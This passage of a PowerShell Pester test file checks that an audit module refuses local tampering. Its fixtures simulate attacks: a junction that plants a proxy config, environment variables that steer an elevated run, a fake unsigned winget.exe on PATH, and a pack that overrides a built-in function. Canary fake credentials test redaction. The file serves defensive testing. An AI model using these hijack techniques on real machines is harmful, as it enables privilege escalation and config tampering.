                    Get-CEConfig -Force | Out-Null
                    (Get-CEConfig).'firmware-catalog'.baseUrl | Should -Be 'https://catalog.example.com'
                    (Get-CEConfig).network.proxyUrl | Should -Be 'http://proxy.contoso.com:3128'
                }
                finally { $script:CEDataRootOverride = $null; Get-CEConfig -Force -WarningAction SilentlyContinue | Out-Null }
            }
        }

        It 'refuses config overrides when elevated if the data folder or the config folder is a link' {
            # A standard user can plant a junction at %ProgramData%\EngramicBaseline. Its own permissions
            # can be locked while the folder it leads to stays theirs, so a link is refused whatever its ACL.
            $target = Join-Path $TestDrive 'bob-data'
            New-Item -ItemType Directory -Force -Path (Join-Path $target 'config') | Out-Null
            Set-Content -LiteralPath (Join-Path (Join-Path $target 'config') 'network.json') -Value '{ "proxyUrl": "http://planted.contoso.com:3128" }'
            $link = Join-Path $TestDrive 'linked-data'
            New-Item -ItemType Junction -Path $link -Target $target | Out-Null
            $real = Join-Path $TestDrive 'real-data'
            New-Item -ItemType Directory -Force -Path $real | Out-Null
            $configLink = Join-Path $real 'config'
            New-Item -ItemType Junction -Path $configLink -Target (Join-Path $target 'config') | Out-Null
            try {
                InModuleScope CEAudit -Parameters @{ Target = $target; Link = $link; Real = $real } {
                    param($Target, $Link, $Real)
                    try {
                        Mock Test-CEIsAdmin { $true }
                        # Every ACL looks locked, as after an install locks a junction.
                        Mock Get-CEPathAclProblem { }
                        @(Get-CEDataPathProblem -Path $Link) -join ' ' | Should -Match 'is a link'
                        @(Get-CEDataPathProblem -Path $Target).Count | Should -Be 0

                        $script:CEDataRootOverride = $Link
                        Get-CEConfig -Force -WarningVariable warned -WarningAction SilentlyContinue | Out-Null
                        (Get-CEConfig).network.proxyUrl | Should -Be '' -Because 'the data folder is a link'
                        "$warned" | Should -Match 'Ignoring config overrides'

                        $script:CEDataRootOverride = $Real
                        Get-CEConfig -Force -WarningAction SilentlyContinue | Out-Null
                        (Get-CEConfig).network.proxyUrl | Should -Be '' -Because 'the config folder is a link'

                        $script:CEDataRootOverride = $Target
                        Get-CEConfig -Force | Out-Null
                        (Get-CEConfig).network.proxyUrl | Should -Be 'http://planted.contoso.com:3128' -Because 'the same file loads from a real folder'
                    }
                    finally { $script:CEDataRootOverride = $null; Get-CEConfig -Force -WarningAction SilentlyContinue | Out-Null }
                }
            }
            finally {
                foreach ($j in @($link, $configLink)) { if (Test-Path -LiteralPath $j) { [IO.Directory]::Delete($j, $false) } }
            }
        }

        It 'refuses a pack under the data folder that is reached through a link' {
            $data = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
            $elsewhere = Join-Path $TestDrive 'bob-packs'
            New-Item -ItemType Directory -Force -Path $data, (Join-Path $elsewhere 'mypack') | Out-Null
            Set-Content -LiteralPath (Join-Path (Join-Path $elsewhere 'mypack') 'pack.json') -Value '{ "id": "mypack", "name": "My pack", "version": "1.0.0" }'
            $packsLink = Join-Path $data 'packs'
            New-Item -ItemType Junction -Path $packsLink -Target $elsewhere | Out-Null
            try {
                InModuleScope CEAudit -Parameters @{ Data = $data } {
                    param($Data)
                    try {
                        $script:CEDataRootOverride = $Data
                        Mock Get-CEPathAclProblem { }
                        $pack = @(Get-CEPackCandidate | Where-Object { $_.Id -eq 'mypack' })
                        $pack.Count | Should -Be 1
                        $pack[0].Status | Should -Be 'Skipped'
                        $pack[0].Reason | Should -Match 'is a link'
                    }
                    finally { $script:CEDataRootOverride = $null }
                }
            }
            finally { [IO.Directory]::Delete($packsLink, $false) }
        }
    }
}

Describe 'Elevated audits cannot be steered by the environment or PATH' {
    # An elevated process started from a user's session can inherit environment variables that
    # user controls, and SYSTEM runs whatever comes first on the machine PATH. Neither may
    # decide what the audit reads or runs.
    Context 'CE_CHECKER_DATA and CE_CHECKER_PACKS' {
        AfterEach {
            Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
            Remove-Item Env:\CE_CHECKER_PACKS -ErrorAction SilentlyContinue
            InModuleScope CEAudit { $script:CEDataRootOverride = $null; $script:CEPackPathOverride = @(); $script:CEIgnoredEnvHooks = @{}; $script:CEConfig = $null }
        }

        It 'still checks data-folder permissions when elevated with CE_CHECKER_DATA set' {
            $env:CE_CHECKER_DATA = Join-Path $TestDrive 'user-data'
            InModuleScope CEAudit {
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { @('C:\x is writable by S-1-5-21-1-2-3-1001') }
                Test-CEDataPathTrusted -Path 'C:\x' -WarningAction SilentlyContinue | Should -BeFalse -Because 'the variable no longer switches the check off'
                Should -Invoke Get-CEPathAclProblem -Times 1 -Exactly
            }
        }

        It 'also checks a data folder moved on the Import-Module line' {
            InModuleScope CEAudit -Parameters @{ Root = (Join-Path $TestDrive 'moved') } {
                param($Root)
                $script:CEDataRootOverride = $Root
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { @("$Path is writable by S-1-5-32-545") }
                Get-CEDataRoot | Should -Be $Root
                Test-CEDataPathTrusted -Path (Join-Path $Root 'config') | Should -BeFalse
            }
        }

        It 'ignores CE_CHECKER_DATA when elevated, with a warning, and honours it otherwise' {
            $userData = Join-Path $TestDrive 'user-data'
            $env:CE_CHECKER_DATA = $userData
            InModuleScope CEAudit -Parameters @{ UserData = $userData } {
                param($UserData)
                Mock Test-CEIsAdmin { $false }
                Get-CEDataRoot | Should -Be $UserData -Because 'it is still a development hook for standard users'
                Mock Test-CEIsAdmin { $true }
                $root = Get-CEDataRoot -WarningVariable warned -WarningAction SilentlyContinue
                $root | Should -Not -Be $UserData
                $root | Should -Match 'EngramicBaseline$'
                "$warned" | Should -Match 'Ignoring the CE_CHECKER_DATA environment variable'
            }
        }

        It 'does not load a forged config override from a CE_CHECKER_DATA folder when elevated' {
            $userData = Join-Path $TestDrive 'forged'
            New-Item -ItemType Directory -Force -Path (Join-Path $userData 'config') | Out-Null
            Set-Content -LiteralPath (Join-Path (Join-Path $userData 'config') 'thresholds.json') -Value '{ "patchWindowDays": 999 }'
            $env:CE_CHECKER_DATA = $userData
            InModuleScope CEAudit {
                Mock Test-CEIsAdmin { $false }
                (Get-CEConfig -Force).thresholds.patchWindowDays | Should -Be 999 -Because 'the fixture is valid and a standard user may steer their own audit'
                Mock Test-CEIsAdmin { $true }
                (Get-CEConfig -Force -WarningAction SilentlyContinue).thresholds.patchWindowDays | Should -Not -Be 999
            }
        }

        It 'drops CE_CHECKER_PACKS folders when elevated but keeps folders passed to Import-Module' {
            $envPacks = Join-Path $TestDrive 'env-packs'
            $argPacks = Join-Path $TestDrive 'arg-packs'
            $env:CE_CHECKER_PACKS = $envPacks
            InModuleScope CEAudit -Parameters @{ EnvPacks = $envPacks; ArgPacks = $argPacks } {
                param($EnvPacks, $ArgPacks)
                $script:CEPackPathOverride = @($ArgPacks)
                Mock Test-CEIsAdmin { $false }
                $paths = Get-CEPackSearchPath
                @($paths | ForEach-Object { $_.Path }) | Should -Contain $EnvPacks
                Mock Test-CEIsAdmin { $true }
                $paths = Get-CEPackSearchPath 3>$null
                @($paths | ForEach-Object { $_.Path }) | Should -Not -Contain $EnvPacks
                ($paths | Where-Object { $_.Path -eq $ArgPacks }).RequireLockedAcl | Should -BeFalse
                ($paths | Where-Object { $_.Path -like '*packs' } | Select-Object -Last 1).RequireLockedAcl | Should -BeTrue -Because 'the data-folder packs are always checked'
            }
        }
    }

    Context 'signed native tools' {
        BeforeAll {
            $script:planted = Join-Path (Join-Path $TestDrive 'on-path') 'winget.exe'
            New-Item -ItemType Directory -Force -Path (Split-Path -Parent $script:planted) | Out-Null
            Set-Content -LiteralPath $script:planted -Value 'not really winget'
        }

        It 'refuses an unsigned binary (real signature check, nothing mocked)' {
            InModuleScope CEAudit -Parameters @{ Planted = $script:planted } {
                param($Planted)
                Test-CESignedBy -Path $Planted -Publisher 'Microsoft Corporation' | Should -BeFalse
                $r = Resolve-CETrustedTool -Candidate @($Planted) -Publisher 'Microsoft Corporation'
                $r.Path | Should -BeNullOrEmpty
                $r.Refused | Should -Be @($Planted)
            }
        }

        It 'accepts only a valid signature whose signer common name is the expected publisher' {
            InModuleScope CEAudit -Parameters @{ Planted = $script:planted } {
                param($Planted)
                $sig = { param($status, $subject) [pscustomobject]@{ Status = $status; SignerCertificate = [pscustomobject]@{ Subject = $subject } } }
                Mock Get-AuthenticodeSignature { & $sig 'Valid' 'CN=Contoso Ltd, O=Contoso Ltd, C=GB' }
                Test-CESignedBy -Path $Planted -Publisher 'Microsoft Corporation' | Should -BeFalse -Because 'signed, but by someone else'
                Mock Get-AuthenticodeSignature { & $sig 'Valid' 'CN=Contoso Ltd, O=Microsoft Corporation' }
                Test-CESignedBy -Path $Planted -Publisher 'Microsoft Corporation' | Should -BeFalse -Because 'only the common name counts'
                Mock Get-AuthenticodeSignature { & $sig 'HashMismatch' 'CN=Microsoft Corporation, O=Microsoft Corporation' }
                Test-CESignedBy -Path $Planted -Publisher 'Microsoft Corporation' | Should -BeFalse -Because 'a tampered file'
                Mock Get-AuthenticodeSignature { & $sig 'Valid' 'CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US' }
                Test-CESignedBy -Path $Planted -Publisher 'Microsoft Corporation' | Should -BeTrue
                Mock Get-AuthenticodeSignature { & $sig 'Valid' 'CN="Docker, Inc.", O="Docker, Inc.", C=US' }
                Test-CESignedBy -Path $Planted -Publisher $script:CEDockerPublishers | Should -BeTrue
                Mock Get-AuthenticodeSignature { throw 'The file cannot be accessed by the system.' }
                Test-CESignedBy -Path $Planted -Publisher 'Microsoft Corporation' | Should -BeFalse -Because 'an app execution alias cannot be verified'
            }
        }

        It 'looks for winget in the App Installer package before PATH' {
            InModuleScope CEAudit {
                Mock Resolve-Path { [pscustomobject]@{ Path = 'C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.29.380.0_x64__8wekyb3d8bbwe\winget.exe' } }
                Mock Get-AppxPackage { [pscustomobject]@{ InstallLocation = 'C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.28.0.0_x64__8wekyb3d8bbwe' } }
                Mock Get-Command {
                    if ($Name -eq 'winget.exe') { return [pscustomobject]@{ Source = 'C:\Users\u\AppData\Local\Microsoft\WindowsApps\winget.exe' } }
                    if ($Name -eq 'Get-AppxPackage') { return [pscustomobject]@{ Name = 'Get-AppxPackage' } }
                }
                $c = @(Get-CEWingetCandidate)
                $c[0] | Should -Match 'DesktopAppInstaller_1\.29'
                $c[1] | Should -Match 'DesktopAppInstaller_1\.28'
                $c[-1] | Should -Match 'AppData\\Local'
            }
        }

        It 'SU-05 does not run a winget found on PATH that is not signed by Microsoft, and says why' {
            InModuleScope CEAudit -Parameters @{ Planted = $script:planted } {
                param($Planted)
                Mock Get-CEDeviceContext { New-TestContext }
                Mock Get-Module { if ($Name -contains 'Microsoft.WinGet.Client') { return } Microsoft.PowerShell.Core\Get-Module @PesterBoundParameters }
                Mock Resolve-Path { if ("$Path" -like '*DesktopAppInstaller*') { return } Microsoft.PowerShell.Management\Resolve-Path @PesterBoundParameters }
                Mock Get-Command {
                    if ($Name -contains 'winget.exe') { return [pscustomobject]@{ Source = $Planted } }
                    if ($Name -contains 'Get-AppxPackage') { return }
                    Microsoft.PowerShell.Core\Get-Command @PesterBoundParameters
                }
                $f = @(Invoke-CEAuditCore -Id 'SU-05')
                $f.Count | Should -Be 1
                $f[0].Status | Should -Be 'Manual'
                $f[0].Actual | Should -Match 'could not be verified as signed by Microsoft'
                $f[0].Actual | Should -Match ([regex]::Escape($Planted))
                Should -Invoke Invoke-CENative -Times 0 -Exactly
            }
        }

        It 'the winget remediation refuses an unverified winget instead of running it' {
            InModuleScope CEAudit -Parameters @{ Planted = $script:planted } {
                param($Planted)
                Mock Resolve-CEWingetPath { [pscustomobject]@{ Path = $null; Refused = @($Planted) } }
                Mock Get-CEDeviceContext { New-TestContext }
                $r = Invoke-CERemediation -Id 'Winget-Upgrade' -Parameters @{ PackageId = '7zip.7zip' }
                $r.Status | Should -Be 'Failed'
                "$($r.Message)" | Should -Match 'not signed by Microsoft, so it was not run'
                Should -Invoke Invoke-CENative -Times 0 -Exactly
            }
        }

        It 'runs dsregcmd only from System32 (or Sysnative), signed by Microsoft Windows' {
            $text = Get-Content (Join-Path (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Private') '02-DeviceContext.ps1') -Raw
            $text | Should -Not -Match "-FilePath\s+'dsregcmd(\.exe)?'" -Because 'never through PATH'
            InModuleScope CEAudit {
                $system = [Environment]::GetFolderPath('System')
                $sysnative = Join-Path ([Environment]::GetFolderPath('Windows')) 'Sysnative'
                foreach ($c in @(Get-CEDsregCandidate)) {
                    [IO.Path]::IsPathRooted($c) | Should -BeTrue
                    (Split-Path -Parent $c) | Should -BeIn @($system, $sysnative)
                    (Split-Path -Leaf $c) | Should -Be 'dsregcmd.exe'
                }

                Mock Resolve-CETrustedTool { [pscustomobject]@{ Path = $null; Refused = @('C:\Windows\System32\dsregcmd.exe') } }
                (Get-CEDsregStatus).Count | Should -Be 0
                Should -Invoke Invoke-CENative -Times 0 -Exactly
                Should -Invoke Resolve-CETrustedTool -Times 1 -Exactly -ParameterFilter { $Publisher -contains 'Microsoft Windows' -and @($Candidate | Where-Object { $_ -notmatch 'dsregcmd\.exe$' }).Count -eq 0 }

                Mock Resolve-CETrustedTool { [pscustomobject]@{ Path = 'C:\Windows\System32\dsregcmd.exe'; Refused = @() } }
                Mock Invoke-CENative { [pscustomobject]@{ ExitCode = 0; Output = @('             AzureAdJoined : YES', '          DomainJoined : NO') } }
                $r = Get-CEDsregStatus
                $r['AzureAdJoined'] | Should -Be 'YES'
                $r['DomainJoined'] | Should -Be 'NO'
                Should -Invoke Invoke-CENative -Times 1 -Exactly -ParameterFilter { $FilePath -eq 'C:\Windows\System32\dsregcmd.exe' }
            }
        }

        It 'does not run a docker on PATH that is not signed by Docker, and notes it' {
            $savedPf = $env:ProgramFiles
            $env:ProgramFiles = Join-Path $TestDrive 'no-program-files'
            try {
                InModuleScope CEAudit -Parameters @{ Planted = $script:planted } {
                    param($Planted)
                    Mock Get-Command { if ($Name -contains 'docker.exe') { return [pscustomobject]@{ Source = $Planted } } Microsoft.PowerShell.Core\Get-Command @PesterBoundParameters }
                    $d = Resolve-CEDockerPath
                    $d.Path | Should -BeNullOrEmpty
                    $d.Refused | Should -Be @($Planted)

                    Mock Get-CEUserProfilePath { 'C:\Users\u' }
                    Mock Get-CEWslDistribution { , @() }
                    Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
                    Mock Get-CEVMwareMachine { , @() }
                    Mock Get-CEVirtualBoxMachine { , @() }
                    Mock Get-CEWslNetworkingMode { '' }
                    Mock Get-CEVirtualisationListener { , @() }
                    $st = Get-CEVirtualisationStateUncached -Context (New-TestContext)
                    @($st.Containers).Count | Should -Be 0
                    @($st.Notes) -join '; ' | Should -Match 'Docker containers were not checked: .* is not signed by Docker'
                    Should -Invoke Invoke-CENative -Times 0 -Exactly
                }
            }
            finally { $env:ProgramFiles = $savedPf }
        }
    }
}

Describe 'Feature packs' {
    # Last in the file: these tests re-import the module with packs installed, then restore it.
    BeforeAll {
        $script:modulePath = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1'
        function global:New-TestPack {
            param([string]$Root, [string]$Folder, $Manifest, [hashtable]$Files = @{})
            $dir = Join-Path $Root $Folder
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
            if ($null -ne $Manifest) {
                $text = if ($Manifest -is [string]) { $Manifest } else { $Manifest | ConvertTo-Json -Depth 5 }
                Set-Content -LiteralPath (Join-Path $dir 'pack.json') -Value $text
            }
            foreach ($rel in $Files.Keys) {
                $target = Join-Path $dir $rel
                New-Item -ItemType Directory -Force -Path (Split-Path -Parent $target) | Out-Null
                Set-Content -LiteralPath $target -Value $Files[$rel]
            }
        }
        $rootA = Join-Path $TestDrive 'packs-a'
        $rootB = Join-Path $TestDrive 'packs-b'
        New-TestPack -Root $rootA -Folder 'good' -Manifest @{ id = 'good-pack'; name = 'Good pack'; version = '1.2.3'; minCoreVersion = '0.1.0'; categories = @(@{ id = 'GoodThings'; label = 'Good things' }) } -Files @{
            'Checks\01-Good.ps1' = @'
function Get-GoodPackAnswer { return (Get-CEConfig).'good-pack'.answer }
Register-CECheck -Id 'GP-01' -Category 'GoodThings' -Severity 'Low' -Title 'Good pack check' -Frameworks @('NCSC') -Reference 'Test.' -Test {
    param($ctx)
    New-CEResult -Status 'Pass' -Expected 'answer' -Actual "answer=$(Get-GoodPackAnswer)" -Remediation (New-CERemediationRef -Id 'GoodPack-Fix')
}
'@
            'Remediations\01-Good.ps1' = @'
Register-CERemediation -Id 'GoodPack-Fix' -Title 'Good pack fix' -Risk 'Low' -Apply { param($p, $undo) }
'@
            'config\good-pack.json' = '{ "answer": 42 }'
        }
        New-TestPack -Root $rootA -Folder 'no-manifest' -Manifest $null
        New-TestPack -Root $rootA -Folder 'bad-json' -Manifest '{ not json'
        New-TestPack -Root $rootA -Folder 'bad-id' -Manifest @{ id = 'Bad Id!'; name = 'x'; version = '1.0.0' }
        New-TestPack -Root $rootA -Folder 'too-new' -Manifest @{ id = 'too-new'; name = 'x'; version = '1.0.0'; minCoreVersion = '99.0.0' }
        New-TestPack -Root $rootA -Folder 'config-clash' -Manifest @{ id = 'config-clash'; name = 'x'; version = '1.0.0' } -Files @{ 'config\thresholds.json' = '{}' }
        New-TestPack -Root $rootA -Folder 'throws' -Manifest @{ id = 'throws'; name = 'x'; version = '1.0.0'; categories = @(@{ id = 'HalfDone'; label = 'Half done' }) } -Files @{
            'Checks\01.ps1' = @'
Register-CECheck -Id 'TH-01' -Category 'HalfDone' -Severity 'Low' -Title 't' -Frameworks @('NCSC') -Reference 't' -Test { }
throw 'boom'
'@
        }
        New-TestPack -Root $rootA -Folder 'duplicate-check' -Manifest @{ id = 'duplicate-check'; name = 'x'; version = '1.0.0' } -Files @{
            'Checks\01.ps1' = "Register-CECheck -Id 'FW-01' -Category 'Firewalls' -Severity 'Low' -Title 't' -Frameworks @('NCSC') -Reference 't' -Test { }"
        }
        New-TestPack -Root $rootA -Folder 'hijack' -Manifest @{ id = 'hijack'; name = 'x'; version = '1.0.0' } -Files @{
            'Checks\01.ps1' = "function Get-CEConfig { @{ hijacked = `$true } }"
        }
        New-TestPack -Root $rootB -Folder 'good-again' -Manifest @{ id = 'good-pack'; name = 'Good pack copy'; version = '9.9.9' }

        # Pack folders go on the Import-Module line: CE_CHECKER_PACKS is ignored when elevated, as CI is.
        # 3>&1: warnings raised while the module loads aren't caught by -WarningVariable.
        $script:packWarnings = @(Import-Module $script:modulePath -Force -ArgumentList $null, @($rootA, $rootB) 3>&1)
        Set-TestTripwires
        $script:packs = @{}
        foreach ($p in @(Get-CEPack)) { $script:packs[(Split-Path -Leaf $p.Path)] = $p }
    }
    AfterAll {
        Import-Module $script:modulePath -Force
        Set-TestTripwires
    }

    It 'loads a valid pack: category, check, remediation, helper functions and config' {
        $good = $script:packs['good']
        $good.Status | Should -Be 'Loaded'
        $good.Version | Should -Be '1.2.3'
        $good.Checks | Should -Be @('GP-01')
        $good.Remediations | Should -Be @('GoodPack-Fix')
        (Get-CECategory | Where-Object Id -eq 'GoodThings').Label | Should -Be 'Good things'
        (Get-CECategory | Where-Object Id -eq 'GoodThings').Pack | Should -Be 'good-pack'
        (Get-CECheck -Id 'GP-01').Pack | Should -Be 'good-pack'
        (Get-CECheck -Id 'FW-01').Pack | Should -BeNullOrEmpty
        InModuleScope CEAudit { Mock Get-CEDeviceContext { New-TestContext } }
        $f = @(Invoke-CEAuditCore -Id 'GP-01')
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Be 'answer=42' -Because "the pack's helper function and config are available when its check runs"
        $f[0].Pack | Should -Be 'good-pack'
        $f[0].Category | Should -Be 'GoodThings'
    }

    It 'skips invalid packs with a reason, without affecting the core' {
        $script:packs['no-manifest'].Reason | Should -Be 'No pack.json'
        $script:packs['bad-json'].Reason | Should -Match 'not valid JSON'
        $script:packs['bad-id'].Reason | Should -Match 'Invalid pack id'
        $script:packs['too-new'].Reason | Should -Match 'Needs Engramic Baseline 99\.0\.0 or later'
        $script:packs['config-clash'].Reason | Should -Match 'Config file name already used: thresholds\.json'
        $script:packs['good-again'].Reason | Should -Match "Pack 'good-pack' is already loaded"
        @(Get-CEPack | Where-Object Status -eq 'Loaded').Count | Should -Be 1
        @(Get-CECheck | Where-Object { -not $_.Pack }).Count | Should -Be 57
    }

    It 'rolls back everything a pack registered when it fails part way' {
        $script:packs['throws'].Status | Should -Be 'Skipped'
        $script:packs['throws'].Reason | Should -Match 'Failed to load: boom'
        @(Get-CECheck -Id 'TH-01').Count | Should -Be 0
        @(Get-CECategory).Id | Should -Not -Contain 'HalfDone'
        $script:packs['duplicate-check'].Reason | Should -Match 'Duplicate check id FW-01'
        @(Get-CECheck -Id 'FW-01').Count | Should -Be 1
        @($script:packWarnings | ForEach-Object { "$_" }) -join "`n" | Should -Match "pack 'throws' was not loaded"
    }

    It 'refuses a pack that replaces a built-in function, and puts the original back' {
        $script:packs['hijack'].Reason | Should -Match 'redefines the built-in function Get-CEConfig'
        (Get-CEConfig -Force).PSObject.Properties.Name | Should -Not -Contain 'hijacked'
        (Get-CEConfig).thresholds.patchWindowDays | Should -Be 14
    }

    It 'lets an administrator override pack config from the data folder' {
        $data = Join-Path $TestDrive 'data-override'
        New-Item -ItemType Directory -Force -Path (Join-Path $data 'config') | Out-Null
        Set-Content -LiteralPath (Join-Path (Join-Path $data 'config') 'good-pack.json') -Value '{ "answer": 7 }'
        # The test folder is writable by the runner's account, which an elevated audit rightly distrusts.
        Mock -ModuleName CEAudit Test-CEIsAdmin { $false }
        InModuleScope CEAudit -Parameters @{ Data = $data } { param($Data) $script:CEDataRootOverride = $Data }
        try { (Get-CEConfig -Force).'good-pack'.answer | Should -Be 7 }
        finally { InModuleScope CEAudit { $script:CEDataRootOverride = $null }; Get-CEConfig -Force | Out-Null }
        (Get-CEConfig).'good-pack'.answer | Should -Be 42
    }

    It 'lists packs in status.json and the reports' {
        InModuleScope CEAudit { Mock Get-CEDeviceContext { New-TestContext } }
        $f = @(Invoke-CEAuditCore -Id 'GP-01')
        $ctx = New-TestContext
        $r = Export-CEReport -Findings $f -Context $ctx -OutputPath (Join-Path $TestDrive 'pack-report')
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('- **Packs:** Good pack 1.2.3'))
        (Get-Content $r.Paths.Html -Raw) | Should -Match 'Packs: Good pack 1\.2\.3'
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match '### Good things'
        $status = ConvertTo-CEStatus -Findings $f -Summary $r.Summary -Context $ctx
        @($status.Packs | Where-Object { $_.Id -eq 'good-pack' -and $_.Status -eq 'Loaded' }).Count | Should -Be 1
        @($status.Packs | Where-Object { $_.Id -eq 'good-pack' -and $_.Status -eq 'Skipped' }).Count | Should -Be 1 -Because 'the duplicate copy is reported too'
        ($status.Packs | Where-Object { $_.Id -eq 'hijack' }).Status | Should -Be 'Skipped'
    }

    It 'checks pack permissions: only administrators, SYSTEM and TrustedInstaller may own or change them' {
        InModuleScope CEAudit {
            $rule = { param($sid, $rights, $type = 'Allow') [pscustomobject]@{ IdentityReference = $sid; FileSystemRights = [long]$rights; AccessControlType = $type } }
            $admins = 'S-1-5-32-544'; $users = 'S-1-5-32-545'; $user = 'S-1-5-21-1-2-3-1001'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @((& $rule 'S-1-5-18' 2032127), (& $rule $admins 2032127), (& $rule $users 1179817))).Count | Should -Be 0 -Because 'users may read and execute'
            @(Test-CEAdminOnlyAcl -Owner $user -Rules @()) | Should -Match 'owned by S-1-5-21-1-2-3-1001'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $users 1180063)) | Should -Match 'writable by S-1-5-32-545' -Because 'Modify includes write'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $user 0x10000000)) | Should -Match 'writable' -Because 'GENERIC_ALL on inherit-only entries'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule 'S-1-3-0' 2032127)).Count | Should -Be 0 -Because 'CREATOR OWNER only affects new items'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $users 2032127 'Deny')).Count | Should -Be 0 -Because 'a deny against a standard user is harmless'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule 'S-1-5-18' 278 'Deny')) | Should -Match 'denies S-1-5-18' -Because 'a deny against SYSTEM could freeze a forged file the tool cannot replace'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule 'S-1-5-32-544' 278 'Deny')) | Should -Match 'denies S-1-5-32-544'
        }
    }

    It 'refuses a pack in the data folder that a standard user could change' -Skip:(-not ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows)) {
        $data = Join-Path $TestDrive 'data-packs'
        New-TestPack -Root (Join-Path $data 'packs') -Folder 'user-owned' -Manifest @{ id = 'user-owned'; name = 'x'; version = '1.0.0' }
        # A moved data folder: its packs get the same permission check as the default one.
        Import-Module $script:modulePath -Force -WarningAction SilentlyContinue -ArgumentList $data
        $p = Get-CEPack | Where-Object Id -eq 'user-owned'
        $p.Status | Should -Be 'Skipped'
        $p.Reason | Should -Match 'Not loaded because non-administrators could change it'
    }
}

Describe 'MCP inventory never records a credential value' {
    # The AI tab and the docs both promise that only where and how a credential is stored is
    # recorded. The classifier honoured that; the two descriptive fields beside it did not.
    It 'redacts a token passed as a server argument' {
        InModuleScope CEAudit {
            $secret = 'sk-ant-api03-LEAKCANARY000000000000000000000000'
            $cfg = ConvertFrom-CEJsonc -Text ('{ "mcpServers": { "s": { "command": "npx", "args": ["-y", "@scope/server", "' + $secret + '"] } } }')
            $recs = @(ConvertTo-CEMcpServers -Config $cfg -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns (Get-CECredentialPatterns))
            ($recs | ConvertTo-Json -Depth 6) | Should -Not -Match 'LEAKCANARY'
            $recs[0].argsSummary | Should -Match '@scope/server'
        }
    }

    It 'keeps only scheme, host and port from a url, dropping userinfo and path' {
        InModuleScope CEAudit {
            $patterns = Get-CECredentialPatterns
            $cases = @(
                @{ Url = 'https://user:LEAKCANARY@mcp.example.com/sse'; Expect = 'https://mcp.example.com/...' },
                @{ Url = 'https://mcp.example.com/LEAKCANARY/sse';      Expect = 'https://mcp.example.com/...' },
                @{ Url = 'https://mcp.example.com:8443/';               Expect = 'https://mcp.example.com:8443' },
                @{ Url = 'https://mcp.example.com/?token=LEAKCANARY';   Expect = 'https://mcp.example.com' }
            )
            foreach ($c in $cases) {
                $cfg = ConvertFrom-CEJsonc -Text ('{ "mcpServers": { "s": { "url": "' + $c.Url + '" } } }')
                $recs = @(ConvertTo-CEMcpServers -Config $cfg -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns $patterns)
                ($recs | ConvertTo-Json -Depth 6) | Should -Not -Match 'LEAKCANARY' -Because $c.Url
                $recs[0].endpoint | Should -Be $c.Expect -Because $c.Url
            }
        }
    }

    It 'redacts a bare high-entropy argument the pattern list does not recognise' {
        InModuleScope CEAudit {
            $cfg = ConvertFrom-CEJsonc -Text '{ "mcpServers": { "s": { "command": "run", "args": ["QWERTYUIOPASDFGHJKLZXCVBNM123456"] } } }'
            $recs = @(ConvertTo-CEMcpServers -Config $cfg -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns (Get-CECredentialPatterns))
            $recs[0].argsSummary | Should -Be '(redacted)'
        }
    }

    Context 'credentials in arguments and the command' {
        BeforeAll {
            # Each secret is a canary no output may contain: connection strings with passwords, a
            # credential-named KEY=value, a value after a credential-named flag, and a token in the command.
            $global:CETestMcpSecrets = @('S3cretPG', 'R3disPass', 'M0ngoPass', 'kvS3cretTok', 'fl4gS3cret', 'Qu3ryPass', 'CmdT0ken', 'C0nnStrPass', 'alice')
            $servers = [ordered]@{
                leakpg    = @{ command = 'npx'; args = @('-y', '@pkg/server-postgres', 'postgresql://app:S3cretPG@db.internal/prod') }
                leakredis = @{ command = 'npx'; args = @('-y', '@pkg/redis', 'redis://:R3disPass@cache.internal:6380') }
                leakmongo = @{ command = 'npx'; args = @('mongodb+srv://user:M0ngoPass@cluster0.example.net/db?retryWrites=true', '@pkg/mongo') }
                leakkv    = @{ command = 'uvx'; args = @('serve', 'API_TOKEN=kvS3cretTok') }
                leakflag  = @{ command = 'node'; args = @('--api-key', 'fl4gS3cret', 'server.js') }
                leakquery = @{ command = 'npx'; args = @('@pkg/pg', 'postgresql://db.internal:5433/prod?password=Qu3ryPass') }
                leakcmd   = @{ command = 'C:\Users\alice\tools\mcp-server.exe --token ghp_CmdT0ken0000000000000000000000000000' }
                leakconn  = @{ command = 'dotnet'; args = @('Mcp.dll', 'Server=db;Password=C0nnStrPass') }
            }
            $global:CETestMcpLeakJson = ([ordered]@{ mcpServers = $servers } | ConvertTo-Json -Depth 5)
            $global:CETestMcpLeakDir = Join-Path $TestDrive 'mcp-leak-profile'
            New-Item -ItemType Directory -Force -Path $global:CETestMcpLeakDir | Out-Null
            $global:CETestMcpLeakJson | Set-Content -LiteralPath (Join-Path $global:CETestMcpLeakDir '.claude.json') -Encoding ascii
        }

        It 'shows no password, token or user name, only the program and scheme://host[:port]' {
            $recs = InModuleScope CEAudit -Parameters @{ J = $global:CETestMcpLeakJson } {
                param($J)
